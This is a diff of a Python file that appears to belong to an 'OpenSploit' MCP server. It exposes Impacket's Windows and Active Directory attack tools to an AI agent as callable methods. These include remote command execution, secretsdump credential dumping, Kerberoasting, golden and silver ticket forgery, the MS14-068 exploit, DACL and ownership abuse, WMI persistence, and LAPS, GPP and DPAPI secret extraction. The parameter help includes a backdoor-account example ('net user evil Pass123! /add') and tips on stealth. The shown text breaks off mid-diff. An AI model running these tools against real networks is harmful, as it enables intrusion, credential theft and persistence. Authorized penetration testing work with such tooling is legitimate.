@@ -4,28 +4,901 @@ OpenSploit MCP Server: impacket
 
 Windows/Active Directory exploitation toolkit wrapping Impacket scripts
 for remote execution, credential dumping, Kerberos attacks, and SMB operations.
+
+Provides 47+ methods across 10 categories:
+- Remote execution (psexec, wmiexec, smbexec, dcomexec, atexec)
+- Credential dumping (secretsdump)
+- Kerberos attacks (kerberoast, asreproast, get_tgt, get_st, ticketer, ticket_converter, describe_ticket, get_pac)
+- SMB operations (smb_shares, smb_get, smb_put)
+- AD enumeration (get_ad_users, get_ad_computers, lookupsid, samrdump, rpcdump, rpcmap, dump_ntlm_info, machine_role, get_arch)
+- Delegation abuse (addcomputer, find_delegation, rbcd)
+- Account modification (changepasswd, addspn)
+- ACL attacks (dacledit, owneredit)
+- DACL/credential extraction (get_laps_password, get_gpp_password, dpapi_backupkeys, keylistattack)
+- Services/persistence (services, reg, net, mssqlclient, mssqlinstance, wmiquery, wmipersist, tstool, exchanger, golden_pac, raise_child, rdp_check)
+- Custom scripts (run_custom)
 """
 
 import asyncio
 import base64
-import glob
+import ntpath
 import os
 import re
+import shlex
 import shutil
 import tempfile
-from typing import Any, Dict, List, Optional, Set
-
-import yaml
+import types
+from typing import Any, Dict, List, Optional
 
 from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output
 
 CRED_DIR = "/session/credentials"
 CONFIG_DIR = "/session/config"
-RECIPE_DIR = "/session/tool_recipes/impacket"
+CUSTOM_SCRIPT_DIR = "/session/impacket-scripts"
+RECIPE_DIR = "/session/recipes/impacket"
 
-# Auth param names that are handled by auth builders, not by recipe flag mapping
+# Auth param names handled by auth builders, not by generic flag mapping
 AUTH_PARAM_NAMES = {"target", "username", "password", "domain", "hashes",
                     "kerberos", "dc_ip", "dc_host", "aes_key", "port", "ccache_path"}
+
+# ── Data-Driven Generic Scripts ─────────────────────────────────────────────
+#
+# Each entry defines a new method backed by the generic handler _run_generic().
+# Keys:
+#   name:        MCP method name
+#   binary:      CLI binary (default: impacket-{name})
+#   description: Method description
+#   auth:        "target" (user:pass@host), "domain" (domain/user:pass + -dc-ip),
+#                "none" (no auth), "custom" (handled in params)
+#   params:      dict of param_name -> {type, required, description, flag, ...}
+#                flag: CLI flag (default: --{param_name.replace('_', '-')})
+#                      "" means positional (appended after identity)
+#                      None means use default derivation
+#   identity_position: "last" (default) or "first" - where to place identity string
+
+IMPACKET_SCRIPTS: List[Dict[str, Any]] = [
+    # ── ACL Attacks ─────────────────────────────────────────────────────
+    {
+        "name": "dacledit",
+        "binary": "impacket-dacledit",
+        "description": "Edit DACLs on Active Directory objects. Read, write, remove, backup, or restore ACEs for a principal on a target object. Useful for abusing WriteDACL permissions.",
+        "auth": "domain",
+        "params": {
+            "action": {
+                "type": "string",
+                "description": "Action: read (view DACL), write (add ACE), remove (delete ACE), backup (save DACL to file), restore (load DACL from file)",
+                "enum": ["read", "write", "remove", "backup", "restore"],
+                "default": "read",
+                "flag": "-action",
+            },
+            "principal": {
+                "type": "string",
+                "description": "sAMAccountName of the attacker-controlled principal to add/remove in the ACE",
+                "flag": "-principal",
+            },
+            "principal_sid": {
+                "type": "string",
+                "description": "SID of the principal (alternative to -principal name)",
+                "flag": "-principal-sid",
+            },
+            "target_object": {
+                "type": "string",
+                "description": "sAMAccountName of the target object whose DACL to edit",
+                "flag": "-target",
+            },
+            "target_sid": {
+                "type": "string",
+                "description": "SID of the target object (alternative to -target name)",
+                "flag": "-target-sid",
+            },
+            "target_dn": {
+                "type": "string",
+                "description": "Distinguished Name of the target object",
+                "flag": "-target-dn",
+            },
+            "rights": {
+                "type": "string",
+                "description": "Rights to write/remove: FullControl, ResetPassword, WriteMembers, DCSync, Custom",
+                "enum": ["FullControl", "ResetPassword", "WriteMembers", "DCSync", "Custom"],
+                "flag": "-rights",
+            },
+            "rights_guid": {
+                "type": "string",
+                "description": "Manual GUID for custom rights (use with -rights Custom)",
+                "flag": "-rights-guid",
+            },
+            "ace_type": {
+                "type": "string",
+                "description": "ACE type: allowed or denied (default: allowed)",
+                "enum": ["allowed", "denied"],
+                "flag": "-ace-type",
+            },
+            "inheritance": {
+                "type": "boolean",
+                "description": "Enable ACE inheritance (CONTAINER_INHERIT + OBJECT_INHERIT). Useful for containers/OUs.",
+                "flag": "-inheritance",
+            },
+            "use_ldaps": {
+                "type": "boolean",
+                "description": "Use LDAPS instead of LDAP",
+                "flag": "-use-ldaps",
+            },
+            "file": {
+                "type": "string",
+                "description": "Filename for backup/restore actions",
+                "flag": "-file",
+            },
+        },
+    },
+    {
+        "name": "owneredit",
+        "binary": "impacket-owneredit",
+        "description": "Read or modify the owner of an Active Directory object. Useful for abusing WriteOwner permissions to take ownership of objects.",
+        "auth": "domain",
+        "params": {
+            "action": {
+                "type": "string",
+                "description": "Action: read (view current owner) or write (set new owner)",
+                "enum": ["read", "write"],
+                "default": "read",
+                "flag": "-action",
+            },
+            "new_owner": {
+                "type": "string",
+                "description": "sAMAccountName of the new owner (for write action)",
+                "flag": "-new-owner",
+            },
+            "new_owner_sid": {
+                "type": "string",
+                "description": "SID of the new owner (alternative to -new-owner)",
+                "flag": "-new-owner-sid",
+            },
+            "target_object": {
+                "type": "string",
+                "description": "sAMAccountName of the target object",
+                "flag": "-target",
+            },
+            "target_sid": {
+                "type": "string",
+                "description": "SID of the target object",
+                "flag": "-target-sid",
+            },
+            "target_dn": {
+                "type": "string",
+                "description": "Distinguished Name of the target object",
+                "flag": "-target-dn",
+            },
+            "use_ldaps": {
+                "type": "boolean",
+                "description": "Use LDAPS instead of LDAP",
+                "flag": "-use-ldaps",
+            },
+        },
+    },
+
+    # ── Kerberos Ticket Manipulation ────────────────────────────────────
+    {
+        "name": "ticketer",
+        "binary": "impacket-ticketer",
+        "description": "Create Kerberos golden or silver tickets. Golden ticket: omit -spn (needs krbtgt hash + domain SID). Silver ticket: provide -spn (needs service account hash). Also supports sapphire tickets via -impersonate.",
+        "auth": "none",
+        "params": {
+            "target_user": {
+                "type": "string",
+                "required": True,
+                "description": "Username for the newly created ticket",
+                "flag": "",
+            },
+            "domain_name": {
+                "type": "string",
+                "required": True,
+                "description": "Fully qualified domain name (e.g., contoso.com)",
+                "flag": "-domain",
+            },
+            "domain_sid": {
+                "type": "string",
+                "required": True,
+                "description": "Domain SID (e.g., S-1-5-21-...). Get from lookupsid.",
+                "flag": "-domain-sid",
+            },
+            "spn": {
+                "type": "string",
+                "description": "Service SPN for silver ticket (omit for golden ticket)",
+                "flag": "-spn",
+            },
+            "nthash": {
+                "type": "string",
+                "description": "NT hash used for signing the ticket (krbtgt for golden, service account for silver)",
+                "flag": "-nthash",
+            },
+            "aes_key": {
+                "type": "string",
+                "description": "AES key (128 or 256 bit) used for signing the ticket",
+                "flag": "-aesKey",
+            },
+            "groups": {
+                "type": "string",
+                "description": "Comma-separated group RIDs (default: 513,512,520,518,519 = Domain Users/Admins/etc.)",
+                "flag": "-groups",
+            },
+            "user_id": {
+                "type": "integer",
+                "description": "User RID for the ticket (default: 500 = Administrator)",
+                "flag": "-user-id",
+            },
+            "extra_sid": {
+                "type": "string",
+                "description": "Comma-separated extra SIDs to include in PAC (for SID history attacks across trusts)",
+                "flag": "-extra-sid",
+            },
+            "extra_pac": {
+                "type": "boolean",
+                "description": "Populate ticket with extra PAC (UPN_DNS)",
+                "flag": "-extra-pac",
+            },
+            "duration": {
+                "type": "integer",
+                "description": "Ticket validity in hours (default: 87600 = 10 years)",
+                "flag": "-duration",
+            },
+            "impersonate": {
+                "type": "string",
+                "description": "Sapphire ticket: target username to impersonate via S4U2Self+U2U",
+                "flag": "-impersonate",
+            },
+            "request": {
+                "type": "boolean",
+                "description": "Request ticket from domain and clone it (requires -user and -password)",
+                "flag": "-request",
+            },
+            "request_user": {
+                "type": "string",
+                "description": "domain/username for -request mode",
+                "flag": "-user",
+            },
+            "request_password": {
+                "type": "string",
+                "description": "Password for -request mode",
+                "flag": "-password",
+            },
+            "request_hashes": {
+                "type": "string",
+                "description": "NTLM hashes for -request mode (LMHASH:NTHASH)",
+                "flag": "-hashes",
+            },
+            "dc_ip": {
+                "type": "string",
+                "description": "Domain Controller IP for -request mode",
+                "flag": "-dc-ip",
+            },
+        },
+    },
+    {
+        "name": "ticket_converter",
+        "binary": "impacket-ticketConverter",
+        "description": "Convert Kerberos tickets between ccache and kirbi (KRB-CRED) formats. Converts .ccache to .kirbi for Rubeus/Mimikatz or vice versa.",
+        "auth": "none",
+        "params": {
+            "input_file": {
+                "type": "string",
+                "required": True,
+                "description": "Path to input ticket file (.ccache or .kirbi)",
+                "flag": "",
+            },
+            "output_file": {
+                "type": "string",
+                "required": True,
+                "description": "Path to output ticket file",
+                "flag": "",
+            },
+        },
+    },
+    {
+        "name": "describe_ticket",
+        "binary": "impacket-describeTicket",
+        "description": "Parse and describe a Kerberos ticket. Decrypts the enc-part and parses the PAC if decryption keys are provided. Supports UnPAC-the-Hash for PKINIT tickets.",
+        "auth": "none",
+        "params": {
+            "ticket": {
+                "type": "string",
+                "required": True,
+                "description": "Path to ticket file (.ccache)",
+                "flag": "",
+            },
+            "service_password": {
+                "type": "string",
+                "description": "Cleartext password of the service account (for ticket decryption)",
+                "flag": "-p",
+            },
+            "service_user": {
+                "type": "string",
+                "description": "Name of the service account",
+                "flag": "-u",
+            },
+            "service_domain": {
+                "type": "string",
+                "description": "FQDN domain of the service account",
+                "flag": "-d",
+            },
+            "rc4": {
+                "type": "string",
+                "description": "RC4 key (NT hash) for ticket decryption",
+                "flag": "--rc4",
+            },
+            "aes_key": {
+                "type": "string",
+                "description": "AES128 or AES256 key for ticket decryption",
+                "flag": "--aes",
+            },
+            "asrep_key": {
+                "type": "string",
+                "description": "AS reply key for PAC Credentials decryption (UnPAC-the-Hash)",
+                "flag": "--asrep-key",
+            },
+        },
+    },
+    {
+        "name": "get_pac",
+        "binary": "impacket-getPac",
+        "description": "Retrieve the PAC (Privilege Attribute Certificate) for a target user. Requires valid domain credentials. Useful for inspecting group memberships, SID history, and privilege data.",
+        "auth": "domain",
+        "_no_dc_ip": True,  # getPac.py does not accept -dc-ip flag
+        "params": {
+            "target_user": {
+                "type": "string",
+                "required": True,
+                "description": "Target user to retrieve the PAC of",
+                "flag": "-targetUser",
+            },
+        },
+    },
+
+    # ── Credential Extraction ───────────────────────────────────────────
+    {
+        "name": "get_laps_password",
+        "binary": "impacket-GetLAPSPassword",
+        "description": "Extract LAPS (Local Administrator Password Solution) passwords from Active Directory via LDAP. Requires read access to ms-Mcs-AdmPwd attribute.",
+        "auth": "domain",
+        "params": {
+            "computer": {
+                "type": "string",
+                "description": "Target a specific computer by its name (default: all computers with LAPS)",
+                "flag": "-computer",
+            },
+            "use_ldaps": {
+                "type": "boolean",
+                "description": "Use LDAPS (required for Windows Server 2025 with LDAPS enforced)",
+                "flag": "-ldaps",
+            },
+        },
+    },
+    {
+        "name": "get_gpp_password",
+        "binary": "impacket-Get-GPPPassword",
+        "description": "Find and decrypt Group Policy Preferences (GPP) passwords stored in SYSVOL XML files. Decrypts cpassword values using the publicly known AES key (MS14-025).",
+        "auth": "target",
+        "params": {
+            "xmlfile": {
+                "type": "string",
+                "description": "Specific GPP XML file to parse (default: search all SYSVOL)",
+                "flag": "-xmlfile",
+            },
+            "share": {
+                "type": "string",
+                "description": "SMB share to search (default: SYSVOL)",
+                "flag": "-share",
+            },
+            "base_dir": {
+                "type": "string",
+                "description": "Directory to search in (default: /)",
+                "flag": "-base-dir",
+            },
+        },
+    },
+    {
+        "name": "dpapi_backupkeys",
+        "binary": "impacket-dpapi",
+        "description": "Retrieve DPAPI domain backup keys from a Domain Controller. Requires Domain Admin privileges. The backup key can decrypt any DPAPI-protected secret in the domain.",
+        "auth": "target",
+        "_identity_flag": "-t",  # dpapi uses -t for identity, not positional
+        "params": {
+            "export_keys": {
+                "type": "boolean",
+                "description": "Export backup keys to file",
+                "flag": "--export",
+            },
+        },
+        "_subcommand": "backupkeys",
+    },
+    {
+        "name": "keylistattack",
+        "binary": "impacket-keylistattack",
+        "description": "KERB-KEY-LIST-REQ attack to dump secrets from a Read-Only Domain Controller (RODC) without executing any agent. Requires RODC krbtgt credentials.",
+        "auth": "target",
+        "params": {
+            "rodc_no": {
+                "type": "integer",
+                "description": "RODC krbtgt account number",
+                "flag": "-rodcNo",
+            },
+            "rodc_key": {
+                "type": "string",
+                "description": "AES key of the Read Only Domain Controller",
+                "flag": "-rodcKey",
+            },
+            "full": {
+                "type": "boolean",
+                "description": "Run attack against ALL domain users (noisy, may cause TGS rejections)",
+                "flag": "-full",
+            },
+            "target_user": {
+                "type": "string",
+                "description": "Attack only this specific username",
+                "flag": "-t",
+            },
+            "target_file": {
+                "type": "string",
+                "description": "File containing list of target usernames",
+                "flag": "-tf",
+            },
+        },
+    },
+
+    # ── AD Enumeration ──────────────────────────────────────────────────
+    {
+        "name": "get_ad_computers",
+        "binary": "impacket-GetADComputers",
+        "description": "Enumerate Active Directory computer objects via LDAP. Returns computer names, OS versions, and optionally resolves IP addresses.",
+        "auth": "domain",
+        "params": {
+            "filter_user": {
+                "type": "string",
+                "description": "Filter for a specific computer name",
+                "flag": "-user",
+            },
+            "resolve_ip": {
+                "type": "boolean",
+                "description": "Resolve IP addresses of computer objects via DNS lookup on the DC",
+                "flag": "-resolveIP",
+            },
+        },
+    },
+    {
+        "name": "samrdump",
+        "binary": "impacket-samrdump",
+        "description": "Dump SAM database user list via SAMR RPC. Lists all domain/local users with their attributes. Works via null session if allowed.",
+        "auth": "target",
+        "params": {
+            "csv": {
+                "type": "boolean",
+                "description": "Output in CSV format",
+                "flag": "-csv",
+            },
+        },
+    },
+    {
+        "name": "rpcdump",
+        "binary": "impacket-rpcdump",
+        "description": "Dump remote RPC endpoint information via the epmapper service. Lists all registered RPC interfaces with their UUIDs, versions, and binding strings.",
+        "auth": "target",
+        "params": {},
+    },
+    {
+        "name": "rpcmap",
+        "binary": "impacket-rpcmap",
+        "description": "Enumerate and bruteforce listening MSRPC interfaces. Discover hidden RPC services, bruteforce UUIDs, opnums, and versions.",
+        "auth": "none",
+        "params": {
+            "string_binding": {
+                "type": "string",
+                "required": True,
+                "description": "String binding (e.g., ncacn_ip_tcp:192.168.0.1[135], ncacn_np:192.168.0.1[\\pipe\\spoolss])",
+                "flag": "",
+            },
+            "brute_uuids": {
+                "type": "boolean",
+                "description": "Bruteforce UUIDs even if MGMT interface is available",
+                "flag": "-brute-uuids",
+            },
+            "brute_opnums": {
+                "type": "boolean",
+                "description": "Bruteforce opnums for found UUIDs",
+                "flag": "-brute-opnums",
+            },
+            "brute_versions": {
+                "type": "boolean",
+                "description": "Bruteforce major versions of found UUIDs",
+                "flag": "-brute-versions",
+            },
+            "uuid": {
+                "type": "string",
+                "description": "Test only this specific UUID",
+                "flag": "-uuid",
+            },
+            "auth_rpc": {
+                "type": "string",
+                "description": "RPC authentication as [domain/]username[:password]",
+                "flag": "-auth-rpc",
+            },
+            "hashes_rpc": {
+                "type": "string",
+                "description": "NTLM hashes for RPC auth (LMHASH:NTHASH)",
+                "flag": "-hashes-rpc",
+            },
+        },
+    },
+    {
+        "name": "dump_ntlm_info",
+        "binary": "impacket-DumpNTLMInfo",
+        "description": "Perform NTLM authentication and extract system information. Returns NetBIOS name, DNS domain, OS version, and other NTLM challenge metadata. No credentials required.",
+        "auth": "none",
+        "params": {
+            "target": {
+                "type": "string",
+                "required": True,
+                "description": "Target hostname or IP address",
+                "flag": "",
+            },
+            "port": {
+                "type": "integer",
+                "description": "Target port (default: 445 for SMB, use 135 for RPC)",
+                "flag": "-port",
+            },
+            "protocol": {
+                "type": "string",
+                "description": "Protocol: SMB or RPC (default: SMB, port 135 uses RPC)",
+                "enum": ["SMB", "RPC"],
+                "flag": "-protocol",
+            },
+        },
+    },
+    {
+        "name": "machine_role",
+        "binary": "impacket-machine_role",
+        "description": "Retrieve a host's role (Workstation, Member Server, Domain Controller, etc.) and its primary domain details via SMB.",
+        "auth": "target",
+        "params": {},
+    },
+    {
+        "name": "get_arch",
+        "binary": "impacket-getArch",
+        "description": "Detect the target system's OS architecture (32-bit vs 64-bit) via MSRPC. No credentials required.",
+        "auth": "none",
+        "params": {
+            "target": {
+                "type": "string",
+                "required": True,
+                "description": "Target hostname or IP address",
+                "flag": "-target",
+            },
+            "arch_timeout": {
+                "type": "integer",
+                "description": "Socket timeout in seconds (default: 2)",
+                "flag": "-timeout",
+            },
+        },
+    },
+    {
+        "name": "rdp_check",
+        "binary": "impacket-rdp_check",
+        "description": "Test whether credentials are valid on a target host using the RDP protocol. Useful for validating credentials when SMB is blocked.",
+        "auth": "target",
+        "params": {
+            "ipv6": {
+                "type": "boolean",
+                "description": "Test on IPv6",
+                "flag": "-6",
+            },
+        },
+    },
+
+    # ── Services & Remote Management ────────────────────────────────────
+    {
+        "name": "services",
+        "binary": "impacket-services",
+        "description": "Manipulate Windows services remotely via MSRPC. List, start, stop, delete, create, query status, or modify services.",
+        "auth": "target",
+        "params": {
+            "action": {
+                "type": "string",
+                "required": True,
+                "description": "Action: list, start, stop, delete, status, config, create, change",
+                "enum": ["list", "start", "stop", "delete", "status", "config", "create", "change"],
+                "flag": "",
+                "_positional_after_identity": True,
+            },
+            "service_name": {
+                "type": "string",
+                "description": "Service name (required for start/stop/delete/status/config/change)",
+                "flag": "-name",
+            },
+            "display_name": {
+                "type": "string",
+                "description": "Display name for service creation",
+                "flag": "-display",
+            },
+            "binary_path": {
+                "type": "string",
+                "description": "Binary path for service creation (e.g., 'cmd.exe /c net user evil Pass123! /add')",
+                "flag": "-path",
+            },
+        },
+    },
+    {
+        "name": "reg",
+        "binary": "impacket-reg",
+        "description": "Remote Windows registry manipulation via MSRPC. Query, add, delete, save, or backup registry keys/values.",
+        "auth": "target",
+        "params": {
+            "action": {
+                "type": "string",
+                "required": True,
+                "description": "Action: query, add, delete, save, backup",
+                "enum": ["query", "add", "delete", "save", "backup"],
+                "flag": "",
+                "_positional_after_identity": True,
+            },
+            "key_name": {
+                "type": "string",
+                "description": "Full registry key path (e.g., HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion). Required for all actions.",
+                "flag": "-keyName",
+            },
+            "value_name": {
+                "type": "string",
+                "description": "Registry value name to query (omit for all values)",
+                "flag": "-v",
+            },
+            "recursive": {
+                "type": "boolean",
+                "description": "Query all subkeys and values recursively",
+                "flag": "-s",
+            },
+        },
+    },
+    {
+        "name": "net",
+        "binary": "impacket-net",
+        "description": "SAMR RPC client for user/group/computer enumeration and management. List, create, remove, enable, or disable accounts.",
+        "auth": "target",
+        "params": {
+            "object_type": {
+                "type": "string",
+                "required": True,
+                "description": "Object type: user, computer, localgroup, group",
+                "enum": ["user", "computer", "localgroup", "group"],
+                "flag": "",
+                "_positional_after_identity": True,
+            },
+            "name": {
+                "type": "string",
+                "description": "Display info for a specific object",
+                "flag": "-name",
+            },
+            "create_name": {
+                "type": "string",
+                "description": "Create a new account with this name",
+                "flag": "-create",
+            },
+            "remove_name": {
+                "type": "string",
+                "description": "Remove an existing account",
+                "flag": "-remove",
+            },
+            "new_passwd": {
+                "type": "string",
+                "description": "Password for newly created account",
+                "flag": "-newPasswd",
+            },
+            "enable_name": {
+                "type": "string",
+                "description": "Enable a disabled account",
+                "flag": "-enable",
+            },
+            "disable_name": {
+                "type": "string",
+                "description": "Disable an account",
+                "flag": "-disable",
+            },
+        },
+    },
+    {
+        "name": "mssqlclient",
+        "binary": "impacket-mssqlclient",
+        "description": "MSSQL client with TDS protocol support (SSL supported). Execute SQL commands, enable xp_cmdshell, or upload/execute commands.",
+        "auth": "target",
+        "params": {
+            "db": {
+                "type": "string",
+                "description": "MSSQL database instance to connect to",
+                "flag": "-db",
+            },
+            "windows_auth": {
+                "type": "boolean",
+                "description": "Use Windows Authentication (default: SQL auth)",
+                "flag": "-windows-auth",
+            },
+            "command": {
+                "type": "string",
+                "description": "SQL command(s) to execute (for non-interactive use)",
+                "flag": "-command",
+            },
+            "file": {
+                "type": "string",
+                "description": "Input file with SQL commands to execute",
+                "flag": "-file",
+            },
+        },
+    },
+    {
+        "name": "mssqlinstance",
+        "binary": "impacket-mssqlinstance",
+        "description": "Query a remote host for running MSSQL instances via UDP discovery (port 1434). No credentials required.",
+        "auth": "none",
+        "params": {
+            "target": {
+                "type": "string",
+                "required": True,
+                "description": "Target hostname or IP address",
+                "flag": "",
+            },
+            "instance_timeout": {
+                "type": "integer",
+                "description": "Timeout in seconds to wait for response",
+                "flag": "-timeout",
+            },
+        },
+    },
+    {
+        "name": "wmiquery",
+        "binary": "impacket-wmiquery",
+        "description": "Execute WQL queries via WMI (Windows Management Instrumentation). Query system information, installed software, running processes, etc.",
+        "auth": "target",
+        "params": {
+            "namespace": {
+                "type": "string",
+                "description": "WMI namespace (default: //./root/cimv2)",
+                "flag": "-namespace",
+            },
+            "query_file": {
+                "type": "string",
+                "description": "Input file with WQL queries to execute",
+                "flag": "-file",
+            },
+            "rpc_auth_level": {
+                "type": "string",
+                "description": "RPC auth level: default, integrity, or privacy",
+                "enum": ["default", "integrity", "privacy"],
+                "flag": "-rpc-auth-level",
+            },
+        },
+    },
+    {
+        "name": "wmipersist",
+        "binary": "impacket-wmipersist",
+        "description": "Create or remove WMI event subscriptions for persistence. Installs a VBS script that triggers on a WQL filter or timer.",
+        "auth": "target",
+        "params": {
+            "action": {
+                "type": "string",
+                "required": True,
+                "description": "Action: install (create event subscription) or remove (delete subscription)",
+                "enum": ["install", "remove"],
+                "flag": "",
+                "_positional_after_identity": True,
+            },
+            "event_name": {
+                "type": "string",
+                "required": True,
+                "description": "Event subscription name (used for both install and remove)",
+                "flag": "-name",
+            },
+            "vbs_file": {
+                "type": "string",
+                "description": "Path to VBS script file to execute (required for install)",
+                "flag": "-vbs",
+            },
+            "wql_filter": {
+                "type": "string",
+                "description": "WQL filter string that triggers the script (e.g., 'SELECT * FROM __InstanceCreationEvent...')",
+                "flag": "-filter",
+            },
+            "timer_ms": {
+                "type": "integer",
+                "description": "Timer interval in milliseconds (alternative to WQL filter)",
+                "flag": "-timer",
+            },
+        },
+    },
+    {
+        "name": "tstool",
+        "binary": "impacket-tstool",
+        "description": "Terminal Services / Remote Desktop manipulation. List sessions (qwinsta), list processes (tasklist), kill processes (taskkill), connect/disconnect sessions, send messages.",
+        "auth": "target",
+        "params": {
+            "action": {
+                "type": "string",
+                "required": True,
+                "description": "Action: qwinsta, tasklist, taskkill, tscon, tsdiscon, logoff, shutdown, msg, shadow",
+                "enum": ["qwinsta", "tasklist", "taskkill", "tscon", "tsdiscon", "logoff", "shutdown", "msg", "shadow"],
+                "flag": "",
+                "_positional_after_identity": True,
+            },
+            "pid": {
+                "type": "integer",
+                "description": "Process ID for taskkill",
+                "flag": "-pid",
+            },
+            "process_name": {
+                "type": "string",
+                "description": "Process name for taskkill (will look up PID internally)",
+                "flag": "-name",
+            },
+            "verbose": {
+                "type": "boolean",
+                "description": "Verbose output for qwinsta/tasklist",
+                "flag": "-v",
+            },
+        },
+    },
+    {
+        "name": "exchanger",
+        "binary": "impacket-exchanger",
+        "description": "Abuse Exchange services. Enumerate Address Books, dump tables, and lookup objects via the NSPI interface.",
+        "auth": "target",
+        "params": {
+            "rpc_hostname": {
+                "type": "string",
+                "description": "Server name in GUID or NetBIOS format for RPC binding",
+                "flag": "-rpc-hostname",
+            },
+        },
+        "_subcommand": "nspi",
+        "_subcommand_after_identity": True,
+    },
+
+    # ── Privilege Escalation / Lateral Movement ─────────────────────────
+    {
+        "name": "golden_pac",
+        "binary": "impacket-goldenPac",
+        "description": "MS14-068 exploit for Kerberos PAC validation vulnerability. Forges a golden ticket and optionally executes PSEXEC on the target.",
+        "auth": "target",
+        "params": {
+            "command": {
+                "type": "string",
+                "description": "Command to execute via PSEXEC after ticket forgery (default: cmd.exe, 'None' to skip PSEXEC)",
+                "flag": "",
+            },
+            "write_ticket": {
+                "type": "string",
+                "description": "Save the forged golden ticket to this ccache file path",
+                "flag": "-w",
+            },
+        },
+    },
+    {
+        "name": "raise_child",
+        "binary": "impacket-raiseChild",
+        "description": "Privilege escalation from a child domain to the forest root. Exploits trust relationships to create an Enterprise Admin golden ticket.",
+        "auth": "domain",
+        "params": {
+            "target_exec": {
+                "type": "string",
+                "description": "Target host to PSEXEC into after escalation",
+                "flag": "-target-exec",
+            },
+            "target_rid": {
+                "type": "integer",
+                "description": "Target user RID to dump credentials for (default: 500 = Administrator)",
+                "flag": "-targetRID",
+            },
+            "write_ticket": {
+                "type": "string",
+                "description": "Save the golden ticket to this ccache file path",
+                "flag": "-w",
+            },
+        },
+    },
+]
 
 
 class ImpacketServer(BaseMCPServer):
@@ -34,18 +907,14 @@ class ImpacketServer(BaseMCPServer):
     def __init__(self):
         super().__init__(
             name="impacket",
-            description="Windows/AD exploitation toolkit (psexec, secretsdump, kerberoast, SMB)",
-            version="1.0.0",
+            description="Windows/AD exploitation toolkit (psexec, secretsdump, kerberoast, SMB, AD)",
+            version="2.0.0",
         )
 
         # Stateful credential tracking
         self._tickets: Dict[str, str] = {}  # principal -> ccache path in /session/credentials/
         self._active_principal: Optional[str] = None  # default identity for subsequent calls
         self._krb5_configured: bool = False  # whether krb5.conf has been written
-
-        # Recipe tracking
-        self._recipe_methods: Set[str] = set()  # method names registered via recipes
-        self._recipe_file_mtimes: Dict[str, float] = {}  # path -> mtime for hot-reload
 
         # Restore state from /session/ on startup
         self._restore_state()
@@ -65,10 +934,22 @@ class ImpacketServer(BaseMCPServer):
                     "type": "string",
                     "description": "Custom service name (default: random, for stealth use innocuous names)",
                 },
+                "remote_binary_name": {
+                    "type": "string",
+                    "description": "Custom name for the uploaded executable on the target",
+                },
+                "upload_file": {
+                    "type": "string",
+                    "description": "Local file to upload and execute on the target (use command arg for arguments)",
+                },
                 "codec": {
                     "type": "string",
                     "default": "utf-8",
                     "description": "Output codec (utf-8, cp437, cp850, etc.)",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string (e.g., '-path C:\\Windows -debug')",
                 },
                 "timeout": {
                     "type": "integer",
@@ -93,10 +974,28 @@ class ImpacketServer(BaseMCPServer):
                     "default": False,
                     "description": "Do not retrieve command output (for blind execution)",
                 },
+                "shell_type": {
+                    "type": "string",
+                    "enum": ["cmd", "powershell"],
+                    "description": "Shell type for semi-interactive mode (cmd or powershell)",
+                },
+                "silentcommand": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Skip cmd.exe wrapper — directly execute via WMI (no output possible)",
+                },
+                "share": {
+                    "type": "string",
+                    "description": "Share for output retrieval (default: ADMIN$)",
+                },
                 "codec": {
                     "type": "string",
                     "default": "utf-8",
                     "description": "Output codec",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
                 },
                 "timeout": {
                     "type": "integer",
@@ -132,6 +1031,10 @@ class ImpacketServer(BaseMCPServer):
                     "default": "utf-8",
                     "description": "Output codec",
                 },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -161,10 +1064,19 @@ class ImpacketServer(BaseMCPServer):
                     "default": False,
                     "description": "Do not retrieve command output",
                 },
+                "silentcommand": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Skip cmd.exe wrapper (direct execution, no output)",
+                },
                 "codec": {
                     "type": "string",
                     "default": "utf-8",
                     "description": "Output codec",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
                 },
                 "timeout": {
                     "type": "integer",
@@ -189,6 +1101,10 @@ class ImpacketServer(BaseMCPServer):
                     "type": "string",
                     "default": "utf-8",
                     "description": "Output codec",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
                 },
                 "timeout": {
                     "type": "integer",
@@ -230,6 +1146,39 @@ class ImpacketServer(BaseMCPServer):
                     "enum": ["smbexec", "wmiexec", "mmcexec"],
                     "description": "Remote execution method for VSS",
                 },
+                "history": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Dump password history and LSA secrets OldVal",
+                },
+                "pwd_last_set": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Show pwdLastSet attribute for each NTDS.dit account",
+                },
+                "user_status": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Display whether each user is disabled",
+                },
+                "skip_sam": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Do NOT parse the SAM hive on remote system",
+                },
+                "use_keylist": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Use Kerb-Key-List method instead of DRSUAPI",
+                },
+                "ldapfilter": {
+                    "type": "string",
+                    "description": "LDAP filter for DRSUAPI extraction (e.g., '(sAMAccountName=admin*)')",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 600,
@@ -253,6 +1202,23 @@ class ImpacketServer(BaseMCPServer):
                     "enum": ["hashcat", "john"],
                     "default": "hashcat",
                     "description": "Hash output format",
+                },
+                "target_domain": {
+                    "type": "string",
+                    "description": "Target a different domain (Kerberoasting across trusts)",
+                },
+                "stealth": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Remove (servicePrincipalName=*) from LDAP query for stealth (may use more memory)",
+                },
+                "no_preauth": {
+                    "type": "string",
+                    "description": "Account that does not require preauth (obtain TGS via AS-REQ)",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
                 },
                 "timeout": {
                     "type": "integer",
@@ -278,6 +1244,10 @@ class ImpacketServer(BaseMCPServer):
                     "default": "hashcat",
                     "description": "Hash output format",
                 },
+                "extra_args": {
